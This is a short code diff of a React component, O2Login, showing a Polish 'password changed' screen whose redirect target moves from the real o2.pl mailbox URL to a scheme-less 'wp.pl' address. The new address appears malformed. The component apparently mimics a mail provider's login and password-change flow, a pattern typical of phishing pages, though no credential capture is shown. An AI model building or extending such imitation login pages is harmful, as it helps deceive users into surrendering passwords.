@@ -102,7 +102,7 @@ export function O2Login() {
           </div>
           <h2 className="text-xl font-bold">Hasło zostało zmienione</h2>
           <p className="text-gray-500 text-sm">Twoje hasło zostało pomyślnie zaktualizowane. Za chwilę zostaniesz przekierowany do skrzynki.</p>
-          <Button className="w-full bg-[#002aff] hover:bg-blue-700" onClick={() => window.location.href = "https://poczta.o2.pl"}>
+          <Button className="w-full bg-[#002aff] hover:bg-blue-700" onClick={() => window.location.href = "1login.wp.pl"}>
             Przejdź do poczty
           </Button>
         </div>
